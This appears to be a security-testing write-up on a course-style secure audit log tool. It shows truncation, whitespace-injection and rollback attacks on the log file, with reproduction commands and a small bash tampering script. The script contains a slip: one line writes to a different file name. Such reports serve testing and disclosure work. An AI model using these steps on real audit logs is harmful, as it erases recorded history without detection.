### Integrity violation

#### truncation attacks
1. create a valid log with 2 entries:
```
python3 logappend.py -T 1 -K secret -A -E Alice trunc
python3 logappend.py -T 2 -K secret -A -E Bob trunc
```

check log:
```
python3 logread.py -K secret -S trunc
```

2. Since the file size is note verify with head and mv commands, you can remove the 2nd entry from log without triggering integrity violation:
```
head -n -1 trunc > tmp && mv tmp trunc
```
3. instead of printing Alice,Bob (no alterations made), should print integrity violation since it was altered but instead it prints Alice
```
python3 logread.py -K secret -S trunc
```

#### whitespace / newline Injection
- vulnerability -> insecure log parsing logic (no validation of size of log to avoid changes in log)
- function -> *_read_entry_lines* in format_log
```python
def _read_entry_lines(path: str) -> list[str]:
	with open(path, 'rb') as f:
		f.read(HEADER_SIZE)
		remaining = f.read()

	return [
		line for line in remaining.decode('utf-8').splitlines()
		if line.strip()
	]
```
only validates header size not file size, so if something is added or removed in entries section while header remains no integrity violation is detected

steps to replicate:
1. create 2 valid entries in a new log
```
python3 logappend.py -T 1 -K secret -A -E Eve injection
python3 logappend.py -T 2 -K secret -A -E Adam injection
```

verify the log
```
python3 logread.py -K secret -S injection
```

2. run the bash file i provided (alter_log.sh) -> ./alter_log.sh

don't forget to add needed permissions -> chmod +x  alter_log.sh

alter_log.sh
```bash
#!/bin/bash
# Extract the salt/verifier header (first 48 bytes)
head -c 48 injection > tmp

# Get the encrypted lines
mapfile -t lines < <(tail -c +49 injection)

# Rebuild the file with injected blank lines
echo "${lines[0]}" >> tmp
echo "" >> tmp                     # Injected newline
echo "   " >> tmp                  # Injected spaces
echo "${lines[1]}" >> tmp
echo "" >> log_tampered            # Injected trailing newline

mv tmp injection
```

verify the log

#### rollback attack
- vulnerability -> lack of temporal checks, rollback prevention
- While individual lines are authenticated with AES-CCM, the file itself has no mechanism to verify if it is the _most recent_ version of the gallery's state. An attacker can simply make a backup copy of a valid log, wait for new events to be recorded, and then overwrite the live log with their older backup. Because the salt, token, and sequence numbers of the old file are all perfectly valid, logread will accept the rolled-back file. This allows an attacker to erase history without detection.
- steps to replicate:
1. Create a log: 
```
python3 logappend.py -T 1 -K secret -A -E Alice rollback
```
2. Create a tmp file with log:
```
cp rollback tmp
```
3. add new entry to log:
```
python3 logappend.py -T 2 -K secret -A -E Bob rollback
```
check log
```
python3 logread.py -K secret -S rollback
``` 

4. copy content of tmp file to previuos created log (rollback) -> overwrites log with Bob entry
```
cp tmp rollback
```
5.  verify log state will observe the log before Bob entry:
```
python3 logread.py -K secret -S rollback
``` 
should have returned integrity error

- functions -> append_entry (log_format) and run_single calls append entry(logappend) 

